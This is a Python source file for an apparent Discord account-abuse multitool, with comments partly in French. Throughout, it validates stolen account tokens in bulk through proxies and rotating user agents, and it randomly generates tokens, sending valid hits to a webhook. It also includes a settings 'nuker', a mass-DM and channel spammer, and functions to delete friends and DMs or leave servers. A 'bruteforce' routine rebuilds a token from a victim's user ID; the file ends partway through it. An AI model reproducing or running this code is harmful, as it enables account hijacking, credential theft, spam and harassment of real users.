import os
import requests
import string
import random
import threading
import time
import json
from itertools import cycle
from datetime import datetime, timezone, UTC
import base64
import sys
import platform
import hashlib
import shutil
from colorama import init, Fore, Style
root_path = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..")
)
if root_path not in sys.path:
    sys.path.insert(0, root_path)
from utilities.core.shrek_ui import set_console_title
from utilities.core.paths import OUTPUT_DIR, TOKENS_FILE, USERAGENTS_FILE

init(autoreset=True)

def success(text): 
    print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def info(text):    
    print(f'{Fore.YELLOW}[{Fore.WHITE}*{Fore.YELLOW}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def warn(text):    
    print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.WHITE}{text}{Style.RESET_ALL}')

TOKEN_FILE = TOKENS_FILE

def load_tokens():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

def print_boxed(info_dict):
    for key, value in info_dict.items():
        print(f'{Fore.YELLOW}{key:20}:{Fore.WHITE} {value}{Style.RESET_ALL}')

LANGUAGES = {
    "da": "Danish, Denmark", "de": "German, Germany", "en-GB": "English, United Kingdom",
    "en-US": "English, United States", "es-ES": "Spanish, Spain", "fr": "French, France",
    "hr": "Croatian, Croatia", "lt": "Lithuanian, Lithuania", "hu": "Hungarian, Hungary",
    "nl": "Dutch, Netherlands", "no": "Norwegian, Norway", "pl": "Polish, Poland",
    "pt-BR": "Portuguese, Brazilian, Brazil", "ro": "Romanian, Romania", "fi": "Finnish, Finland",
    "sv-SE": "Swedish, Sweden", "vi": "Vietnamese, Vietnam", "tr": "Turkish, Turkey",
    "cs": "Czech, Czechia, Czech Republic", "el": "Greek, Greece", "bg": "Bulgarian, Bulgaria",
    "ru": "Russian, Russia", "uk": "Ukranian, Ukraine", "th": "Thai, Thailand",
    "zh-CN": "Chinese, China", "ja": "Japanese", "zh-TW": "Chinese, Taiwan", "ko": "Korean, Korea",
}


def get_token_info(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        
        if response.status_code != 200:
            return {'Status': 'Invalid', 'Token': token}
            
        api = response.json()
        status = 'Valid'
        
        # Données de base
        user_id = api.get('id', 'None')
        discriminator = api.get('discriminator', '0')
        username = api.get('username', 'None')
        full_username = f"{username}#{discriminator}" if discriminator != "0" else username
        display_name = api.get('global_name', 'None')
        
        email = api.get('email', 'None')
        email_verified = api.get('verified', 'None')
        phone = api.get('phone', 'None')
        mfa = api.get('mfa_enabled', 'None')
        
        # Langue & Localisation
        locale = api.get('locale', 'None')
        language = LANGUAGES.get(locale, locale)
        
        # Cosmétiques & Profil
        avatar = api.get('avatar', 'None')
        avatar_decoration = api.get('avatar_decoration_data', 'None')
        public_flags = api.get('public_flags', 'None')
        flags = api.get('flags', 'None')
        banner = api.get('banner', 'None')
        banner_color = api.get('banner_color', 'None')
        accent_color = api.get('accent_color', 'None')
        nsfw = api.get('nsfw_allowed', 'None')
        
        # Date de création du compte
        try:
            created_at = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000, tz=timezone.utc).strftime("%d-%m-%Y %H:%M:%S UTC")
        except Exception:
            created_at = 'None'
            
        # Type de Nitro & Calcul des jours restants via l'API de facturation
        premium_type = api.get('premium_type', 0)
        nitro_types = {
            1: 'Nitro Classic',
            2: 'Nitro Boosts',
            3: 'Nitro Basic'
        }
        nitro = nitro_types.get(premium_type, 'False')
        days_left = None
        
        if premium_type != 0:
            try:
                sub_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
                if sub_res.status_code == 200:
                    sub_data = sub_res.json()
                    if sub_data and len(sub_data) > 0:
                        d1 = datetime.strptime(sub_data[0]["current_period_end"].split(".")[0], "%Y-%m-%dT%H:%M:%S")
                        d2 = datetime.strptime(sub_data[0]["current_period_start"].split(".")[0], "%Y-%m-%dT%H:%M:%S")
                        days_left = abs((d2 - d1).days)
            except Exception:
                pass

        try:
            if avatar != 'None' and user_id != 'None':
                gif_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.gif"
                if requests.head(gif_url, timeout=3).status_code == 200:
                    avatar_url = gif_url
                else:
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png"
            else:
                avatar_url = 'None'
        except Exception:
            avatar_url = 'None'

        return {
            'Status': status,
            'Token': token,
            'Username': full_username,
            'Display Name': display_name,
            'Id': user_id,
            'Created': created_at,
            'Country': locale,
            'Language': language,
            'Email': email,
            'Verified': email_verified,
            'Phone': phone,
            'MFA': mfa,
            'Nitro': nitro,
            'Nitro Days Left': days_left,
            'Avatar Decor': avatar_decoration,
            'Avatar': avatar,
            'Avatar URL': avatar_url,
            'Accent Color': accent_color,
            'Banner': banner,
            'Banner Color': banner_color,
            'Flags': flags,
            'Public Flags': public_flags,
            'NSFW': nsfw
        }

    except Exception as e:
        return {'Status': 'Invalid', 'Token': token, 'Error': str(e)}

# --- LOGIQUE D'EXÉCUTION PRINCIPALE ---
if __name__ == "__main__":
    # 1. Demande à l'utilisateur de saisir le token
    user_token = input("Veuillez entrer le token à vérifier : ").strip()
    
    if user_token:
        print("\nRécupération des informations en cours...\n")
        
        # 2. Appel de la fonction avec le token saisi
        token_data = get_token_info(user_token)
        
        # 3. Affichage formaté des résultats
        if token_data.get('Status') == 'Valid':
            print("--- INFORMATIONS DU COMPTE ---")
            for key, value in token_data.items():
                print(f"{key.ljust(18)} : {value}")
            print("------------------------------")
        else:
            print("Erreur : Le token est invalide ou a expiré.")
    else:
        print("Erreur : Aucun token n'a été saisi.")

def token_login():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found in tokens.txt')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')
        return
    else:
        info('Testing all tokens from tokens.txt...')
        for token in tokens:
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                if r.status_code == 200:
                    user = r.json()
                    success(f"Valid token: {token} | User: {user.get('username', 'Unknown')}#{user.get('discriminator', '')}")
                else:
                    warn(f'Invalid token: {token} | Status code: {r.status_code}')
            except Exception as e:
                warn(f'Error testing token {token}: {e}')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def generate_single_token():
    first = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([24, 26]))))
    second = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(6)))
    third = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(38)))
    return f'{first}.{second}.{third}'

def send_webhook(embed_content, webhook_url):
    headers = {'Content-Type': 'application/json'}
    requests.post(webhook_url, data=json.dumps(embed_content), headers=headers)

def token_check(token, webhook_url=None, use_webhook=False):
    try:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        user['username']
        if use_webhook and webhook_url:
            embed_content = {'title': 'Token Valid!', 'description': f'**Token:**\n```{token}```', 'color': 1752220}
            send_webhook(embed_content, webhook_url)
        success(f'Valid Token: {token}')
    except:
        warn(f'Invalid Token: {token}')

def token_generator():
    info('Generates random Discord tokens and optionally validates them.')
    use_webhook_input = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Send valid tokens to a webhook? (y/n): {Style.RESET_ALL}').strip().lower()
    use_webhook = use_webhook_input in ['y', 'yes']
    webhook_url = None
    if use_webhook:
        webhook_url = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Webhook URL: {Style.RESET_ALL}').strip()
    try:
        threads_number = int(input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Number of threads: {Style.RESET_ALL}'))
    except:
        warn('Invalid input')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')
        return

    def worker():
        token = generate_single_token()
        token_check(token, webhook_url, use_webhook)

    info('Press CTRL+C to stop token generation.')
    try:
        threads = []
        for _ in range(threads_number):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        pass
    info('Stopping token generation.')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_nuker():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    info('Rapidly change status, theme, and language using a token.')
    token = tokens[0]
    custom_status_input = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Custom Status: {Style.RESET_ALL}').strip()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    default_status = 'Nuking By DiscordTool'
    custom_status = f'{custom_status_input} | Nuker'
    modes = cycle(['light', 'dark'])
    try:
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json={'custom_status': {'text': default_status}})
        success(f'Default status set: {default_status}')
        for _ in range(5):
            lang = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
            requests.patch('https://discord.com/api/v7/users/@me/settings', headers=headers, json={'locale': lang})
            theme = next(modes)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json={'theme': theme})
            time.sleep(0.5)
        requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json={'custom_status': {'text': custom_status}})
        success(f'Custom status set: {custom_status}')
        for _ in range(5):
            lang = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
            requests.patch('https://discord.com/api/v7/users/@me/settings', headers=headers, json={'locale': lang})
            theme = next(modes)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json={'theme': theme})
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    warn('Nuker stopped by user')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_joiner():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    invite = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Invite link: {Style.RESET_ALL}').strip()
    invite_code = invite.split('/')[-1]
    try:
        response = requests.get(f'https://discord.com/api/v9/invites/{invite_code}')
        server_name = response.json().get('guild', {}).get('name', invite)
    except:
        server_name = invite
    try:
        r = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers={'Authorization': token})
        if r.status_code == 200:
            success(f'Joined Server: {server_name}')
        else:
            warn(f'Error {r.status_code} Server: {server_name}')
    except:
        warn(f'Error Server: {server_name}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_leaver():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    try:
        guilds = requests.get('https://discord.com/api/v8/users/@me/guilds', headers={'Authorization': token}).json()
        if not guilds:
            warn('No servers found')
            input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
            return
        for guild in guilds:
            try:
                r = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}", headers={'Authorization': token})
                if r.status_code in [200, 204]:
                    success(f"Left Server: {guild['name']}")
                else:
                    warn(f"Error {r.status_code} Server: {guild['name']}")
            except Exception as e:
                warn(f'Error: {e}')
    except Exception as e:
        warn(f'Error: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def get_creation_date(user_id: int) -> datetime:
    return datetime.fromtimestamp((user_id >> 22) / 1000 + 1420070400, tz=timezone.utc)

def format_age(created_at: datetime) -> str:
    now = datetime.now(timezone.utc)
    months = (now.year - created_at.year) * 12 + now.month - created_at.month
    return f'{months} Month(s)'

def save_to_file(path: str, content: str):
    with open(path, 'a', encoding='utf-8') as f:
        f.write(content + '\n')

def check_token(line, proxies, valid_path, invalid_path):
    token = line.strip().split(':')[-1]
    try:
        with open(USERAGENTS_FILE, 'r', encoding='utf-8') as f:
            user_agents = f.read().splitlines()
        if user_agents:
            user_agent = random.choice(user_agents)
        else:
            raise ValueError('user-agents.txt is empty!')
    except Exception as e:
        warn(f'Error loading user-agents.txt: {e}')
        return
    headers = {'Authorization': token, 'User-Agent': user_agent}
    timestamp = datetime.now().strftime('%I:%M%p')
    try:
        u = requests.get('https://discord.com/api/v10/users/@me', headers=headers, proxies=proxies, timeout=10)
    except requests.exceptions.RequestException as e:
        warn(f'{timestamp} Error checking user: {e}')
        return
    slots = None
    try:
        slots = requests.get('https://discord.com/api/v10/users/@me/guilds/premium/subscription-slots', headers=headers, proxies=proxies, timeout=10)
    except requests.exceptions.RequestException:
        pass
    if u.status_code != 200:
        log = f'{timestamp} <+> Checked Token. Token={token} Status=Invalid'
        warn(log)
        save_to_file(invalid_path, log)
    else:
        user = u.json()
        age = format_age(get_creation_date(int(user['id'])))
        verif = 'Fully Verified' if user.get('verified') else 'Unverified'
        nitro_type = user.get('premium_type', 0)
        has_nitro = nitro_type in (1, 2)
        nitro_str = 'True' if has_nitro else 'False'
        expiry = '28 Day(s)'
        boosts = 0
        if slots and slots.status_code == 200:
            arr = slots.json()
            boosts = sum(1 for s in arr if not s.get('guild_id') and not s.get('cooldown_ends_at'))
        log = f'{timestamp} <+> Checked Token. Token={token} Status=Valid Age="{age}" Verification-Status="{verif}" Redeemable=False Has-Nitro={nitro_str} Nitro-Expiry="{expiry}" Unused-Boosts={boosts}'
        success(log)
        save_to_file(valid_path, log)

def start_checker():
    input_file = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} File: {Style.RESET_ALL}').strip()
    proxy_line = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Proxy: {Style.RESET_ALL}').strip()
    proxy_url = f'http://{proxy_line}'
    proxies = {'http': proxy_url, 'https': proxy_url}
    valid_path = os.path.join(OUTPUT_DIR, 'tokens_valid.txt')
    invalid_path = os.path.join(OUTPUT_DIR, 'tokens_invalid.txt')
    timestamp = datetime.now().strftime('%I:%M%p')
    try:
        test_resp = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
        if test_resp.status_code == 200:
            ip = test_resp.json().get('origin', 'N/A')
            success(f'{timestamp} Proxy OK | IP: {ip}')
        else:
            warn(f'{timestamp} Proxy test failed | Code: {test_resp.status_code}')
            return
    except requests.exceptions.RequestException as e:
        warn(f'{timestamp} Proxy error: {e}')
        return
    if not os.path.exists(input_file):
        warn(f'{timestamp} File not found: {input_file}')
        return
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    for line in lines:
        if ':' not in line or len(line.strip().split(':')) < 3:
            warn(f'Skipped line (bad format): {line.strip()}')
            continue
        check_token(line.strip(), proxies, valid_path, invalid_path)

def token_spammer():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    target_id = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Target ID (User or Channel): {Style.RESET_ALL}').strip()
    message = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Message: {Style.RESET_ALL}').strip()
    try:
        count = int(input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Number of messages: {Style.RESET_ALL}'))
    except:
        warn('Invalid input')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    for _ in range(count):
        try:
            r = requests.post(f'https://discord.com/api/v9/channels/{target_id}/messages', headers=headers, json={'content': message})
            if r.status_code == 200:
                success('Message sent')
            else:
                warn(f'Error {r.status_code}')
        except Exception as e:
            warn(f'Exception: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_delete_friend():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    friend_id = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Friend ID: {Style.RESET_ALL}').strip()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        r = requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend_id}', headers=headers)
        if r.status_code in [200, 204]:
            success(f'Friend deleted: {friend_id}')
        else:
            warn(f'Error {r.status_code}')
    except Exception as e:
        warn(f'Exception: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_block_friend():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    friend_id = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Friend ID: {Style.RESET_ALL}').strip()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        r = requests.put(f'https://discord.com/api/v8/users/@me/relationships/{friend_id}', headers=headers, json={'type': 2})
        if r.status_code in [200, 204]:
            success(f'Friend blocked: {friend_id}')
        else:
            warn(f'Error {r.status_code}')
    except Exception as e:
        warn(f'Exception: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_delete_dm():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    dm_id = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} DM ID: {Style.RESET_ALL}').strip()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        r = requests.delete(f'https://discord.com/api/v9/channels/{dm_id}', headers=headers)
        if r.status_code in [200, 204]:
            success(f'DM {dm_id} deleted')
        else:
            warn(f'Error {r.status_code}')
    except Exception as e:
        warn(f'Exception: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_status_changer():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    status_options = ['online', 'idle', 'dnd', 'invisible']
    info(f'Available statuses: {status_options}')
    status = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} New status: {Style.RESET_ALL}').strip().lower()
    if status not in status_options:
        warn('Invalid status')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        payload = {'status': status}
        r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
        if r.status_code in [200, 204]:
            success(f'Status changed: {status}')
        else:
            warn(f'Error {r.status_code}')
    except Exception as e:
        warn(f'Exception: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_language_changer():
    info('Change your Discord client language.')
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found in tokens.txt')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')
        return
    lang_options = ['da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']
    info(f'Available languages: {lang_options}')
    lang = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} New language: {Style.RESET_ALL}').strip()
    if lang not in lang_options:
        warn('Invalid language')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')
        return
    headers_list = [{'Authorization': token, 'Content-Type': 'application/json'} for token in tokens]
    for token, headers in zip(tokens, headers_list):
        try:
            payload = {'locale': lang}
            r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
            if r.status_code in [200, 204]:
                success(f'Token {token}: Language changed to {lang}')
            else:
                warn(f'Token {token}: Error {r.status_code}')
        except Exception as e:
            warn(f'Token {token}: Exception {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_house_changer():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    house_id = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} New house/layout ID: {Style.RESET_ALL}').strip()
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        payload = {'house_id': house_id}
        r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=payload)
        if r.status_code in [200, 204]:
            success(f'House/layout changed to {house_id}')
        else:
            warn(f'Error {r.status_code}')
    except Exception as e:
        warn(f'Exception: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_theme_changer():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    token = tokens[0]
    theme_options = ['light', 'dark']
    info(f'Available themes: {theme_options}')
    theme = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} New theme: {Style.RESET_ALL}').strip().lower()
    if theme not in theme_options:
        warn('Invalid theme')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        r = requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json={'theme': theme})
        if r.status_code in [200, 204]:
            success(f'Theme changed to {theme}')
        else:
            warn(f'Error {r.status_code}')
    except Exception as e:
        warn(f'Exception: {e}')
    input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def token_dm_all():
    tokens = load_tokens()
    if not tokens:
        warn('No tokens found')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
        return
    
    token = tokens[0]
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    message = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Message to send: {Style.RESET_ALL}').strip()
    info('Choose sending mode:')
    print(f'    {Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}DMs only')
    print(f'    {Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}Server text channels only')
    print(f'    {Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Both DMs and server text channels')
    mode = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Mode (1/2/3): {Style.RESET_ALL}').strip()
    
    def get_dm_channels():
        try:
            response = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
            if response.status_code == 200:
                channels = response.json()
                return [channel for channel in channels if channel['type'] == 1]
            else:
                warn(f'Error fetching DM channels: Code {response.status_code}')
                return []
        except Exception as e:
            warn(f'Error: {e}')
            return []
    
    def get_server_channels():
        try:
            guilds = requests.get('https://discord.com/api/v8/users/@me/guilds', headers=headers).json()
            text_channels = []
            for guild in guilds:
                guild_id = guild['id']
                response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
                if response.status_code == 200:
                    channels = response.json()
                    for channel in channels:
                        if channel['type'] == 0:
                            permissions = channel.get('permissions', 0)
                            if permissions & 2048:
                                text_channels.append(channel)
                else:
                    warn(f'Error fetching channels for guild {guild_id}: Code {response.status_code}')
            return text_channels
        except Exception as e:
            warn(f'Error fetching server channels: {e}')
            return []
    
    def send_message(channel_id, message):
        try:
            response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json={'content': message})
            if response.status_code in (200, 201):
                return True
            else:
                warn(f'Error sending message to channel {channel_id}: Code {response.status_code}')
                return False
        except Exception as e:
            warn(f'Error: {e}')
            return False
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code != 200:
            warn(f'Invalid token or API error: Code {response.status_code}')
            input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
            return
        
        dm_channels = []
        server_channels = []
        if mode in ['1', '3']:
            dm_channels = get_dm_channels()
            if not dm_channels:
                warn('No DM channels found')
        if mode in ['2', '3']:
            server_channels = get_server_channels()
            if not server_channels:
                warn('No accessible server text channels found')
        
        total_channels = dm_channels + server_channels
        if not total_channels:
            warn('No channels available to send messages')
            input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
            return
        
        success(f'Found {len(total_channels)} channels (DMs: {len(dm_channels)}, Server: {len(server_channels)}). Sending messages...')
        for channel in total_channels:
            channel_id = channel['id']
            try:
                if send_message(channel_id, message):
                    success(f'Message sent to channel {channel_id}')
                else:
                    warn(f'Failed to send to channel {channel_id}')
                time.sleep(1)
            except Exception as e:
                warn(f'Error sending to channel {channel_id}: {e}')
        success(f'Sending completed to {len(total_channels)} channels')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')
    except Exception as e:
        warn(f'Error validating token: {e}')
        input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')

def current_time_hour():
    return time.strftime('%H:%M:%S')

def Reset():
    sys.exit()

def CheckWebhook(webhook_url):
    try:
        response = requests.get(webhook_url)
        if response.status_code != 200:
            warn(f'Invalid webhook URL: {webhook_url}')
            Reset()
    except requests.exceptions.RequestException as e:
        warn(f'Error checking webhook: {e}')
        Reset()

def ErrorNumber():
    warn('Invalid number. Please enter a valid integer.')
    Reset()

def bruteforce():
    info('Discord Token To Id')
    try:
        userid = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Victime ID: {Style.RESET_ALL}').strip()
        OnePartToken = str(base64.b64encode(userid.encode('utf-8')), 'utf-8').replace('=', '')
        info(f'Part One Token: {OnePartToken}.')
        brute = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Find the second part by brute force ? (y/n): {Style.RESET_ALL}').strip()
        if brute.lower() not in ['y', 'yes']:
            input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return... {Style.RESET_ALL}')
            Reset()
        webhook = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Webhook ? (y/n): {Style.RESET_ALL}').strip()
        webhook_url = None
        if webhook.lower() in ['y', 'yes']:
            webhook_url = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Webhook URL: {Style.RESET_ALL}').strip()
